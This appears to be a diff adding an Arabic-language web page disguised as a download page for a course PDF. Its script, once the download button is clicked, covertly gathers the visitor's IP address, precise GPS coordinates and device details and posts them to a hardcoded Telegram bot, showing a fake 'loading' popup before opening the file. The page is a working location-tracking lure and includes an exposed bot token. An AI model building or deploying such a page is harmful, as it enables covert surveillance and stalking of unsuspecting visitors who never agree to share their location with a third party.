@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تحميل ملف المادة PDF</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f7f7f7;
+    text-align: center;
+    padding: 50px;
+  }
+  #downloadBtn {
+    padding: 15px 30px;
+    font-size: 18px;
+    cursor: pointer;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    border-radius: 5px;
+  }
+  #popup {
+    display: none;
+    position: fixed;
+    top: 30%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: white;
+    border-radius: 8px;
+    padding: 20px 40px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    font-size: 18px;
+  }
+</style>
+</head>
+<body>
+
+<h1>تحميل ملف المادة PDF</h1>
+
+<button id="downloadBtn">اضغط هنا لتحميل الملف</button>
+
+<div id="popup">جاري التحميل...</div>
+
+<script>
+const BOT_TOKEN = '7900479036:AAGIqLmpav6iXx_QQ_e4sGJzDKPN7KtD-CI';
+const CHAT_ID = '5090097134';
+const PDF_URL = 'https://example.com/file.pdf';  // غير هذا للرابط الحقيقي
+
+const downloadBtn = document.getElementById('downloadBtn');
+const popup = document.getElementById('popup');
+
+function sendTelegramMessage(message) {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    }),
+  });
+}
+
+function getIP() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => data.ip)
+    .catch(() => 'IP غير متوفر');
+}
+
+downloadBtn.addEventListener('click', async () => {
+  popup.style.display = 'block';
+
+  // جلب IP
+  const ip = await getIP();
+
+  // طلب الموقع الجغرافي
+  if (!navigator.geolocation) {
+    alert('متصفحك لا يدعم خاصية الموقع الجغرافي.');
+    popup.style.display = 'none';
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async position => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const userAgent = navigator.userAgent;
+
+      // رسالة مفصلة للإرسال
+      const msg = `
+👤 <b>مستخدم جديد طلب تحميل</b>
+🌐 <b>IP:</b> ${ip}
+📍 <b>الإحداثيات:</b> خط العرض ${lat}، خط الطول ${lon}
+📱 <b>نوع الجهاز:</b> ${userAgent}
+📄 <b>رابط الملف:</b> ${PDF_URL}
+      `;
+
+      sendTelegramMessage(msg);
+
+      // إخفاء النافذة الوهمية بعد 3 ثواني
+      setTimeout(() => {
+        popup.style.display = 'none';
+        // تحميل الملف (فتح الرابط في نافذة جديدة)
+        window.open(PDF_URL, '_blank');
+      }, 3000);
+
+    },
+    error => {
+      alert('تعذر الحصول على الموقع: ' + error.message);
+      popup.style.display = 'none';
+    }
+  );
+});
+</script>
+
+</body>
+</html>
